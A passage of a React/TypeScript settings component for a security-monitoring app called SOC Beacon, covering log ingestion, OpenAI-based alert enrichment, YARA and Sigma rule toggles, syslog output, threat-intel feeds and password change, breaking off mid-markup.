"use client"

import { useEffect, useState } from "react"
import { cn } from "@/lib/utils"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { Switch } from "@/components/ui/switch"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { toast } from "sonner"
import {
  saveSettingsAction,
  changePasswordAction,
  getSigmaStatusAction,
  syncSigmaRulesAction,
  addThreatFeedAction,
  removeThreatFeedAction,
  toggleThreatFeedAction,
  toggleYaraRuleAction,
  updateThreatFeedApiKeyAction,
} from "@/app/actions"
import type { ThreatFeed, YaraRule } from "@/lib/types"
import {
  Radio,
  Key,
  Server,
  Shield,
  FileCode,
  Send,
  Eye,
  EyeOff,
  Save,
  RotateCcw,
  RefreshCw,
  Plus,
  Trash2,
  User,
  Lock,
  HelpCircle,
  Loader2,
} from "lucide-react"

function CurlExample({ label, cmd }: { label: string; cmd: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <div className="bg-background/40 rounded-md border border-border/20 overflow-hidden">
      <div className="flex items-center justify-between px-3 py-1.5 border-b border-border/15 bg-muted/10">
        <span className="text-[10px] text-muted-foreground/60 font-medium">{label}</span>
        <button
          onClick={() => { navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(() => setCopied(false), 2000) }}
          className="text-[10px] text-muted-foreground/40 hover:text-muted-foreground flex items-center gap-1"
        >
          {copied ? "✓ Copied" : "Copy"}
        </button>
      </div>
      <pre className="text-[10px] font-mono text-foreground/60 whitespace-pre-wrap break-all px-3 py-2 leading-relaxed overflow-x-auto">{cmd}</pre>
    </div>
  )
}

function SectionCard({
  title,
  description,
  icon: Icon,
  children,
}: {
  title: string
  description: string
  icon: typeof Radio
  children: React.ReactNode
}) {
  return (
    <div className="glass rounded-lg">
      <div className="flex items-center gap-3 p-5 pb-0">
        <div className="flex items-center justify-center w-8 h-8 rounded-md bg-foreground/5 border border-border/30">
          <Icon className="w-4 h-4 text-foreground/60" />
        </div>
        <div>
          <h3 className="text-sm font-medium text-foreground">{title}</h3>
          <p className="text-[11px] text-muted-foreground mt-0.5">{description}</p>
        </div>
      </div>
      <div className="p-5 flex flex-col gap-4">{children}</div>
    </div>
  )
}

function PasswordInput({
  id,
  value,
  onChange,
  placeholder,
}: {
  id: string
  value: string
  onChange: (v: string) => void
  placeholder?: string
}) {
  const [show, setShow] = useState(false)
  return (
    <div className="relative">
      <Input
        id={id}
        type={show ? "text" : "password"}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="bg-background/60 border-border/50 h-8 text-xs font-mono pr-8 placeholder:text-muted-foreground/40 focus:border-foreground/30"
      />
      <button
        type="button"
        onClick={() => setShow(!show)}
        className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
      >
        {show ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
      </button>
    </div>
  )
}

function generateApiKey(): string {
  if (typeof window === "undefined" || !window.crypto?.getRandomValues) {
    return `sk-beacon-${Math.random().toString(36).slice(2)}`
  }
  const bytes = new Uint8Array(32)
  window.crypto.getRandomValues(bytes)
  const raw = String.fromCharCode(...bytes)
  const base64 = btoa(raw).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "")
  return `sk-beacon-${base64}`
}

interface SettingsViewProps {
  initialSettings: Record<string, unknown>
  initialFeeds: ThreatFeed[]
  initialYaraRules: YaraRule[]
}

export function SettingsView({ initialSettings, initialFeeds, initialYaraRules }: SettingsViewProps) {
  const general = (initialSettings.general || {}) as Record<string, unknown>
  const syslog = (initialSettings.syslog || {}) as Record<string, unknown>
  const api = (initialSettings.api || {}) as Record<string, unknown>
  const llm = (initialSettings.llm || {}) as Record<string, unknown>
  const yara = (initialSettings.yara || {}) as Record<string, unknown>
  const sigma = (initialSettings.sigma || {}) as Record<string, unknown>
  const syslogOut = (initialSettings.syslogOutput || {}) as Record<string, unknown>

  // General
  const [instanceName, setInstanceName] = useState((general.instanceName as string) || "SOC Beacon - Production")
  const [retentionDays, setRetentionDays] = useState(String(general.retentionDays || 90))

  // Syslog Input
  const [syslogEnabled, setSyslogEnabled] = useState(syslog.enabled !== false)
  const [syslogPort, setSyslogPort] = useState(String(syslog.port || 1514))
  const [syslogProtocol, setSyslogProtocol] = useState<"udp" | "tcp" | "both">((syslog.protocol as "udp" | "tcp" | "both") || "both")
  const [syslogTls, setSyslogTls] = useState(!!(syslog.tls))

  // API Ingestion
  const [apiEnabled, setApiEnabled] = useState(api.enabled !== false)
  const [apiPort, setApiPort] = useState(String(api.port || 8443))
  const [apiKey, setApiKey] = useState((api.apiKey as string) || "")

  // LLM Configuration
  const llmProvider: "openai" = "openai"
  const [llmApiKey, setLlmApiKey] = useState((llm.apiKey as string) || "")
  const [llmModel, setLlmModel] = useState((llm.model as string) || "gpt-4.1-nano")
  const [llmEndpoint, setLlmEndpoint] = useState((llm.endpoint as string) || "https://api.openai.com/v1")
  const [llmMaxTokens, setLlmMaxTokens] = useState(String(llm.maxTokens || 700))
  const [llmTemperature, setLlmTemperature] = useState(String(llm.temperature || 0.1))
  const [autoEnrich, setAutoEnrich] = useState(llm.autoEnrich !== false)
  const [analysisAgents, setAnalysisAgents] = useState(String(llm.analysisAgents || 3))
  const [autoStatusThreshold, setAutoStatusThreshold] = useState(String(llm.autoStatusConfidenceThreshold || 90))
  const [verdictMaliciousThreshold, setVerdictMaliciousThreshold] = useState(String(llm.verdictMaliciousThreshold || 80))
  const [verdictSuspiciousThreshold, setVerdictSuspiciousThreshold] = useState(String(llm.verdictSuspiciousThreshold || 45))

  // YARA Rules
  const [yaraEnabled, setYaraEnabled] = useState(yara.enabled !== false)
  const [yaraAutoUpdate, setYaraAutoUpdate] = useState(!!(yara.autoUpdate))
  const [customYaraRules, setCustomYaraRules] = useState(initialYaraRules)

  // Sigma Rules
  const [sigmaEnabled, setSigmaEnabled] = useState(!!sigma.enabled)
  const [sigmaRulesPath, setSigmaRulesPath] = useState((sigma.rulesPath as string) || "")
  const [sigmaMaxRules, setSigmaMaxRules] = useState(String(sigma.maxRules || 500))
  const [sigmaStatus, setSigmaStatus] = useState<{ totalFiles: number; compiled: number; lastSyncAt?: string; lastSyncStatus?: string; lastSyncError?: string } | null>(null)
  const [sigmaSyncing, setSigmaSyncing] = useState(false)
  const [sigmaStatusLoading, setSigmaStatusLoading] = useState(false)

  // Syslog Output
  const [syslogOutputEnabled, setSyslogOutputEnabled] = useState(!!(syslogOut.enabled))
  const [syslogOutputHost, setSyslogOutputHost] = useState((syslogOut.host as string) || "10.0.0.50")
  const [syslogOutputPort, setSyslogOutputPort] = useState(String(syslogOut.port || 5514))
  const [syslogOutputFormat, setSyslogOutputFormat] = useState<"cef" | "leef" | "json">((syslogOut.format as "cef" | "leef" | "json") || "cef")

  // Threat Intel Feeds
  const [threatFeeds, setThreatFeeds] = useState(initialFeeds)
  const [newFeedName, setNewFeedName] = useState("")
  const [newFeedUrl, setNewFeedUrl] = useState("")

  // Auth
  const [currentPassword, setCurrentPassword] = useState("")
  const [newPassword, setNewPassword] = useState("")
  const [confirmPassword, setConfirmPassword] = useState("")

  // Loading states
  const [saving, setSaving] = useState<string | null>(null)

  const handleSave = async (section: string, data: unknown) => {
    setSaving(section)
    try {
      const result = await saveSettingsAction(section, JSON.stringify(data))
      if (result.success) {
        toast.success(`${section} settings saved`, { description: "Changes will take effect immediately." })
      } else {
        toast.error(`Failed to save: ${result.error}`)
      }
    } catch {
      toast.error("Failed to save settings")
    }
    setSaving(null)
  }

  const handleAddFeed = async () => {
    if (newFeedName && newFeedUrl) {
      const result = await addThreatFeedAction({ name: newFeedName, url: newFeedUrl })
      if (result.success) {
        setThreatFeeds([...threatFeeds, { id: result.id!, name: newFeedName, url: newFeedUrl, apiKey: "", enabled: true }])
        setNewFeedName("")
        setNewFeedUrl("")
        toast.success("Threat feed added")
      }
    }
  }

  const handleRemoveFeed = async (id: string, index: number) => {
    await removeThreatFeedAction(id)
    setThreatFeeds(threatFeeds.filter((_, i) => i !== index))
    toast.success("Threat feed removed")
  }

  const handleToggleFeed = async (id: string, index: number, enabled: boolean) => {
    await toggleThreatFeedAction(id, enabled)
    const updated = [...threatFeeds]
    updated[index] = { ...updated[index], enabled }
    setThreatFeeds(updated)
  }

  const handleToggleYaraRule = async (id: string, index: number, enabled: boolean) => {
    await toggleYaraRuleAction(id, enabled)
    const updated = [...customYaraRules]
    updated[index] = { ...updated[index], enabled }
    setCustomYaraRules(updated)
  }

  const handlePasswordChange = async () => {
    if (!currentPassword) {
      toast.error("Current password is required")
      return
    }
    if (newPassword !== confirmPassword) {
      toast.error("New passwords do not match")
      return
    }
    if (newPassword.length < 8) {
      toast.error("Password must be at least 8 characters")
      return
    }
    setSaving("password")
    const result = await changePasswordAction(currentPassword, newPassword)
    if (result.success) {
      toast.success("Password updated successfully")
      setCurrentPassword("")
      setNewPassword("")
      setConfirmPassword("")
    } else {
      toast.error(result.error || "Failed to update password")
    }
    setSaving(null)
  }

  const loadSigmaStatus = async () => {
    setSigmaStatusLoading(true)
    const result = await getSigmaStatusAction()
    if (result.success && result.status) {
      setSigmaStatus({
        totalFiles: result.status.totalFiles,
        compiled: result.status.compiled,
        lastSyncAt: result.status.lastSyncAt,
        lastSyncStatus: result.status.lastSyncStatus,
        lastSyncError: result.status.lastSyncError,
      })
      if (result.status.rulesPath) {
        setSigmaRulesPath(result.status.rulesPath)
      }
    }
    setSigmaStatusLoading(false)
  }

  const handleSigmaSync = async () => {
    setSigmaSyncing(true)
    const result = await syncSigmaRulesAction()
    if (result.success && result.status) {
      setSigmaEnabled(true)
      setSigmaRulesPath(result.status.rulesPath)
      setSigmaStatus({
        totalFiles: result.status.totalFiles,
        compiled: result.status.compiled,
        lastSyncAt: result.status.lastSyncAt,
        lastSyncStatus: result.status.lastSyncStatus,
        lastSyncError: result.status.lastSyncError,
      })
      toast.success("SigmaHQ rules synced")
    } else {
      toast.error(result.error || "Failed to sync Sigma rules")
    }
    setSigmaSyncing(false)
  }

  useEffect(() => {
    loadSigmaStatus()
  }, [])

  const SaveButton = ({ section, onClick }: { section: string; onClick: () => void }) => (
    <Button
      size="sm"
      className="h-8 text-xs bg-foreground text-background hover:bg-foreground/90"
      onClick={onClick}
      disabled={saving === section}
    >
      {saving === section ? <Loader2 className="w-3.5 h-3.5 mr-1.5 animate-spin" /> : <Save className="w-3.5 h-3.5 mr-1.5" />}
      Save
    </Button>
  )

  return (
    <Tabs defaultValue="general" className="w-full">
      <TabsList className="bg-card/60 border border-border/50 h-9 p-1 flex-wrap">
        <TabsTrigger value="general" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Radio className="w-3.5 h-3.5 mr-1.5" />General
        </TabsTrigger>
        <TabsTrigger value="ingestion" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Server className="w-3.5 h-3.5 mr-1.5" />Ingestion
        </TabsTrigger>
        <TabsTrigger value="ai" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Key className="w-3.5 h-3.5 mr-1.5" />AI / LLM
        </TabsTrigger>
        <TabsTrigger value="yara" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <FileCode className="w-3.5 h-3.5 mr-1.5" />YARA Rules
        </TabsTrigger>
        <TabsTrigger value="sigma" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Shield className="w-3.5 h-3.5 mr-1.5" />Sigma
        </TabsTrigger>
        <TabsTrigger value="output" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Send className="w-3.5 h-3.5 mr-1.5" />Output
        </TabsTrigger>
        <TabsTrigger value="threatintel" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Shield className="w-3.5 h-3.5 mr-1.5" />Threat Intel
        </TabsTrigger>
        <TabsTrigger value="auth" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <Lock className="w-3.5 h-3.5 mr-1.5" />Authentication
        </TabsTrigger>
        <TabsTrigger value="help" className="text-xs data-[state=active]:bg-foreground/10 data-[state=active]:text-foreground h-7">
          <HelpCircle className="w-3.5 h-3.5 mr-1.5" />Help
        </TabsTrigger>
      </TabsList>

      {/* General */}
      <TabsContent value="general" className="mt-4 flex flex-col gap-5">
        <SectionCard title="Instance Configuration" description="General settings for this SOC Beacon instance" icon={Radio}>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="flex flex-col gap-1.5">
              <Label htmlFor="instanceName" className="text-[11px] text-muted-foreground">Instance Name</Label>
              <Input id="instanceName" value={instanceName} onChange={(e) => setInstanceName(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs placeholder:text-muted-foreground/40 focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label htmlFor="retention" className="text-[11px] text-muted-foreground">Log Retention (days)</Label>
              <Input id="retention" type="number" value={retentionDays} onChange={(e) => setRetentionDays(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs placeholder:text-muted-foreground/40 focus:border-foreground/30" />
            </div>
          </div>
          <div className="flex justify-end">
            <SaveButton section="General" onClick={() => handleSave("general", { instanceName, retentionDays: parseInt(retentionDays) || 90 })} />
          </div>
        </SectionCard>
      </TabsContent>

      {/* Ingestion */}
      <TabsContent value="ingestion" className="mt-4 flex flex-col gap-5">
        <SectionCard title="Syslog Receiver" description="Configure syslog ingestion endpoint for receiving logs from network devices" icon={Server}>
          <div className="flex items-center justify-between">
            <div>
              <span className="text-xs text-foreground">Enable Syslog Receiver</span>
              <p className="text-[11px] text-muted-foreground">Listen for incoming syslog messages</p>
            </div>
            <Switch checked={syslogEnabled} onCheckedChange={setSyslogEnabled} />
          </div>
          {syslogEnabled && (
            <>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Port</Label>
                  <Input value={syslogPort} onChange={(e) => setSyslogPort(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Protocol</Label>
                  <div className="flex items-center gap-1 h-8">
                    {(["udp", "tcp", "both"] as const).map((p) => (
                      <button key={p} onClick={() => setSyslogProtocol(p)} className={cn("flex-1 h-full rounded text-[11px] uppercase font-mono transition-colors border", syslogProtocol === p ? "bg-foreground/10 border-foreground/30 text-foreground" : "border-border/50 text-muted-foreground hover:text-foreground")}>
                        {p}
                      </button>
                    ))}
                  </div>
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">TLS Encryption</Label>
                  <div className="flex items-center gap-2 h-8">
                    <Switch checked={syslogTls} onCheckedChange={setSyslogTls} />
                    <span className="text-[11px] text-muted-foreground">{syslogTls ? "Enabled" : "Disabled"}</span>
                  </div>
                </div>
              </div>
              <div className="bg-background/40 rounded-md p-3 border border-border/20">
                <p className="text-[11px] text-muted-foreground font-mono">
                  {"Listening on "}{syslogProtocol === "both" ? "UDP+TCP" : syslogProtocol.toUpperCase()}{" "}:{syslogPort}{syslogTls ? " (TLS)" : ""}
                </p>
              </div>
            </>
          )}
          <div className="flex justify-end">
            <SaveButton section="Syslog" onClick={() => handleSave("syslog", { enabled: syslogEnabled, port: parseInt(syslogPort) || 1514, protocol: syslogProtocol, tls: syslogTls })} />
          </div>
        </SectionCard>

        <SectionCard title="API Ingestion" description="REST API endpoint for programmatic log submission" icon={Key}>
          <div className="flex items-center justify-between">
            <div>
              <span className="text-xs text-foreground">Enable API Endpoint</span>
              <p className="text-[11px] text-muted-foreground">Accept logs via HTTPS REST API</p>
            </div>
            <Switch checked={apiEnabled} onCheckedChange={setApiEnabled} />
          </div>
          {apiEnabled && (
            <>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">API Port</Label>
                  <Input value={apiPort} onChange={(e) => setApiPort(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">API Key</Label>
                  <div className="flex items-center gap-2">
                    <PasswordInput id="apiKey" value={apiKey} onChange={setApiKey} placeholder="sk-beacon-..." />
                    <Button variant="ghost" size="sm" className="h-8 px-2 text-muted-foreground hover:text-foreground shrink-0"
                      onClick={() => { const newKey = generateApiKey(); setApiKey(newKey); toast.success("API key regenerated") }}>
                      <RotateCcw className="w-3.5 h-3.5" />
                    </Button>
                  </div>
                </div>
              </div>
              <div className="bg-background/40 rounded-md p-3 border border-border/20">
                <p className="text-[11px] text-muted-foreground mb-1">Endpoint:</p>
                <code className="text-[11px] font-mono text-foreground/70">POST https://your-server:{apiPort}/api/v1/logs</code>
              </div>
            </>
          )}
          <div className="flex justify-end">
            <SaveButton section="API" onClick={() => handleSave("api", { enabled: apiEnabled, port: parseInt(apiPort) || 8443, apiKey })} />
          </div>
        </SectionCard>
      </TabsContent>

      {/* AI / LLM */}
      <TabsContent value="ai" className="mt-4 flex flex-col gap-5">
        <SectionCard title="LLM Provider Configuration" description="Configure the AI model used for log analysis and enrichment" icon={Key}>
          <div className="flex flex-col gap-1.5">
            <Label className="text-[11px] text-muted-foreground">Provider</Label>
            <div className="h-8 rounded-md border border-border/50 bg-background/60 px-2.5 flex items-center">
              <span className="text-xs font-mono text-foreground">OpenAI (locked)</span>
            </div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">API Key</Label>
              <PasswordInput id="llmApiKey" value={llmApiKey} onChange={setLlmApiKey} placeholder="sk-..." />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Model</Label>
              <Input value={llmModel} onChange={(e) => setLlmModel(e.target.value)} placeholder="gpt-4.1-nano" className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-7 gap-4">
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">API Endpoint</Label>
              <Input value={llmEndpoint} onChange={(e) => setLlmEndpoint(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Max Tokens</Label>
              <Input type="number" value={llmMaxTokens} onChange={(e) => setLlmMaxTokens(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Temperature</Label>
              <Input type="number" step="0.1" min="0" max="2" value={llmTemperature} onChange={(e) => setLlmTemperature(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Agent Calls / Alert</Label>
              <Input type="number" min="1" max="4" value={analysisAgents} onChange={(e) => setAnalysisAgents(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Auto Incident Threshold (%)</Label>
              <Input type="number" min="1" max="100" value={autoStatusThreshold} onChange={(e) => setAutoStatusThreshold(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Malicious Threshold (%)</Label>
              <Input type="number" min="1" max="100" value={verdictMaliciousThreshold} onChange={(e) => setVerdictMaliciousThreshold(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
            <div className="flex flex-col gap-1.5">
              <Label className="text-[11px] text-muted-foreground">Suspicious Threshold (%)</Label>
              <Input type="number" min="1" max="99" value={verdictSuspiciousThreshold} onChange={(e) => setVerdictSuspiciousThreshold(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
            </div>
          </div>
          <div className="flex items-center justify-between py-1">
            <div>
              <span className="text-xs text-foreground">Auto-Enrich Alerts</span>
              <p className="text-[11px] text-muted-foreground">Automatically send new alerts to LLM for analysis</p>
            </div>
            <Switch checked={autoEnrich} onCheckedChange={setAutoEnrich} />
          </div>
          <div className="bg-background/40 rounded-md p-3 border border-border/20">
            <div className="flex items-center justify-between text-[11px]">
              <span className="text-muted-foreground">System Prompt Preview</span>
            </div>
            <pre className="mt-2 text-[11px] font-mono text-foreground/50 leading-relaxed whitespace-pre-wrap">
{`Multi-agent enrichment (up to 4 low-cost calls):
1) Incident triage scoring
2) IOC/detection quality review
3) Threat-intel correlation (IP/URL/domain/hash)
4) SOC response plan

Model default: gpt-4.1-nano`}
            </pre>
          </div>
          <div className="flex justify-end">
            <SaveButton section="LLM" onClick={() => handleSave("llm", {
              provider: llmProvider,
              apiKey: llmApiKey,
              model: llmModel,
              endpoint: llmEndpoint,
              maxTokens: parseInt(llmMaxTokens) || 700,
              temperature: parseFloat(llmTemperature) || 0.1,
              autoEnrich,
              analysisAgents: Math.max(1, Math.min(4, parseInt(analysisAgents) || 3)),
              autoStatusConfidenceThreshold: Math.max(1, Math.min(100, parseInt(autoStatusThreshold) || 90)),
              verdictMaliciousThreshold: Math.max(1, Math.min(100, parseInt(verdictMaliciousThreshold) || 80)),
              verdictSuspiciousThreshold: Math.max(1, Math.min(99, parseInt(verdictSuspiciousThreshold) || 45)),
            })} />
          </div>
        </SectionCard>
      </TabsContent>

      {/* YARA Rules */}
      <TabsContent value="yara" className="mt-4 flex flex-col gap-5">
        <SectionCard title="YARA Rule Engine" description="Configure YARA rule scanning for incoming logs and payloads" icon={FileCode}>
          <div className="flex items-center justify-between">
            <div>
              <span className="text-xs text-foreground">Enable YARA Scanning</span>
              <p className="text-[11px] text-muted-foreground">Scan ingested logs against YARA rule sets</p>
            </div>
            <Switch checked={yaraEnabled} onCheckedChange={setYaraEnabled} />
          </div>
          {yaraEnabled && (
            <>
              <div className="flex flex-col gap-1.5">
                <Label className="text-[11px] text-muted-foreground">Auto-Update Rules</Label>
                <div className="flex items-center gap-2 h-8">
                  <Switch checked={yaraAutoUpdate} onCheckedChange={setYaraAutoUpdate} />
                  <span className="text-[11px] text-muted-foreground">{yaraAutoUpdate ? "Enabled (daily)" : "Disabled"}</span>
                </div>
              </div>
              <div className="flex flex-col gap-2">
                <span className="text-[11px] text-muted-foreground font-medium">Active Rules</span>
                <div className="bg-background/40 rounded-md border border-border/20 divide-y divide-border/20">
                  {customYaraRules.map((rule, i) => (
                    <div key={rule.id} className="flex items-center justify-between px-3 py-2">
                      <div className="flex items-center gap-2">
                        <FileCode className="w-3 h-3 text-muted-foreground/60" />
                        <code className="text-[11px] font-mono text-foreground/70">{rule.name}</code>
                      </div>
                      <Switch checked={rule.enabled} onCheckedChange={(checked) => handleToggleYaraRule(rule.id, i, checked)} />
                    </div>
                  ))}
                </div>
              </div>
            </>
          )}
          <div className="flex justify-end">
            <SaveButton section="YARA" onClick={() => handleSave("yara", { enabled: yaraEnabled, autoUpdate: yaraAutoUpdate })} />
          </div>
        </SectionCard>
      </TabsContent>

      {/* Sigma Rules */}
      <TabsContent value="sigma" className="mt-4 flex flex-col gap-5">
        <SectionCard title="Sigma Rule Engine" description="Use SigmaHQ YAML detection rules for log correlation" icon={Shield}>
          <div className="flex items-center justify-between">
            <div>
              <span className="text-xs text-foreground">Enable Sigma Matching</span>
              <p className="text-[11px] text-muted-foreground">Apply Sigma rules during log ingestion</p>
            </div>
            <Switch checked={sigmaEnabled} onCheckedChange={setSigmaEnabled} />
          </div>
          {sigmaEnabled && (
            <>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Sigma Rules Path (local clone)</Label>
                  <Input
                    value={sigmaRulesPath}
                    onChange={(e) => setSigmaRulesPath(e.target.value)}
                    placeholder="C:\\rules\\sigma\\rules"
                    className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30"
                  />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Max Rules To Load</Label>
                  <Input
                    type="number"
                    min="10"
                    max="5000"
                    value={sigmaMaxRules}
                    onChange={(e) => setSigmaMaxRules(e.target.value)}
                    className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30"
                  />
                </div>
              </div>
              <div className="bg-background/40 rounded-md p-3 border border-border/20">
                <p className="text-[11px] text-muted-foreground">
                  Clone SigmaHQ locally and point to its <code className="font-mono">rules</code> folder.
                </p>
              </div>
            </>
          )}
          <div className="flex flex-wrap items-center gap-2">
            <Button
              size="sm"
              variant="ghost"
              className="h-8 text-xs text-muted-foreground hover:text-foreground"
              onClick={handleSigmaSync}
              disabled={sigmaSyncing}
            >
              {sigmaSyncing ? <Loader2 className="w-3.5 h-3.5 mr-1.5 animate-spin" /> : <RotateCcw className="w-3.5 h-3.5 mr-1.5" />}
              Download/Update SigmaHQ Rules
            </Button>
            <Button
              size="sm"
              variant="ghost"
              className="h-8 text-xs text-muted-foreground hover:text-foreground"
              onClick={loadSigmaStatus}
              disabled={sigmaStatusLoading}
            >
              {sigmaStatusLoading ? <Loader2 className="w-3.5 h-3.5 mr-1.5 animate-spin" /> : <RefreshCw className="w-3.5 h-3.5 mr-1.5" />}
              Refresh Status
            </Button>
          </div>
          <div className="bg-background/40 rounded-md p-3 border border-border/20 text-[11px] text-muted-foreground">
            <div className="flex flex-col gap-1">
              <span>Rules loaded: {sigmaStatus ? `${sigmaStatus.compiled} compiled / ${sigmaStatus.totalFiles} files` : "unknown"}</span>
              <span>Last sync: {sigmaStatus?.lastSyncAt ? new Date(sigmaStatus.lastSyncAt).toLocaleString() : "never"}</span>
              <span>Status: {sigmaStatus?.lastSyncStatus || "unknown"}</span>
              {sigmaStatus?.lastSyncError && (
                <span className="text-red-400">Error: {sigmaStatus.lastSyncError}</span>
              )}
            </div>
          </div>
          <div className="flex justify-end">
            <SaveButton section="Sigma" onClick={() => handleSave("sigma", { enabled: sigmaEnabled, rulesPath: sigmaRulesPath, maxRules: Math.max(10, Math.min(5000, parseInt(sigmaMaxRules) || 500)) })} />
          </div>
        </SectionCard>
      </TabsContent>

      {/* Output */}
      <TabsContent value="output" className="mt-4 flex flex-col gap-5">
        <SectionCard title="Syslog Output" description="Forward enriched alerts to external SIEMs via syslog" icon={Send}>
          <div className="flex items-center justify-between">
            <div>
              <span className="text-xs text-foreground">Enable Syslog Output</span>
              <p className="text-[11px] text-muted-foreground">Forward enriched alert data to your SIEM</p>
            </div>
            <Switch checked={syslogOutputEnabled} onCheckedChange={setSyslogOutputEnabled} />
          </div>
          {syslogOutputEnabled && (
            <>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Destination Host</Label>
                  <Input value={syslogOutputHost} onChange={(e) => setSyslogOutputHost(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Port</Label>
                  <Input value={syslogOutputPort} onChange={(e) => setSyslogOutputPort(e.target.value)} className="bg-background/60 border-border/50 h-8 text-xs font-mono focus:border-foreground/30" />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label className="text-[11px] text-muted-foreground">Output Format</Label>
                  <div className="flex items-center gap-1 h-8">
                    {(["cef", "leef", "json"] as const).map((f) => (
                      <button key={f} onClick={() => setSyslogOutputFormat(f)} className={cn("flex-1 h-full rounded text-[11px] uppercase font-mono transition-colors border", syslogOutputFormat === f ? "bg-foreground/10 border-foreground/30 text-foreground" : "border-border/50 text-muted-foreground hover:text-foreground")}>
                        {f}
                      </button>
                    ))}
                  </div>
                </div>
              </div>
              <div className="bg-background/40 rounded-md p-3 border border-border/20">
                <p className="text-[11px] text-muted-foreground mb-1">Output destination:</p>
                <code className="text-[11px] font-mono text-foreground/70">{syslogOutputFormat.toUpperCase()} {"->"} {syslogOutputHost}:{syslogOutputPort}</code>
              </div>
            </>
          )}
          <div className="flex justify-end">
            <SaveButton section="Output" onClick={() => handleSave("syslogOutput", { enabled: syslogOutputEnabled, host: syslogOutputHost, port: parseInt(syslogOutputPort) || 5514, format: syslogOutputFormat })} />
          </div>
        </SectionCard>
      </TabsContent>

      {/* Threat Intel */}
      <TabsContent value="threatintel" className="mt-4 flex flex-col gap-5">
        <SectionCard title="Threat Intelligence Feeds" description="Configure external threat intelligence sources for alert enrichment" icon={Shield}>
          <div className="flex flex-col gap-2">
            <div className="bg-background/40 rounded-md border border-border/20 divide-y divide-border/20">
              {threatFeeds.map((feed, i) => (
                <div key={feed.id} className="flex items-center justify-between px-3 py-2.5">
                  <div className="flex flex-col gap-0.5 flex-1 min-w-0">
                    <span className="text-xs text-foreground/80">{feed.name}</span>
                    <code className="text-[10px] font-mono text-muted-foreground/60 truncate">{feed.url}</code>
                  </div>
                  <div className="flex items-center gap-2 shrink-0 ml-2">
                    <div className="w-32">
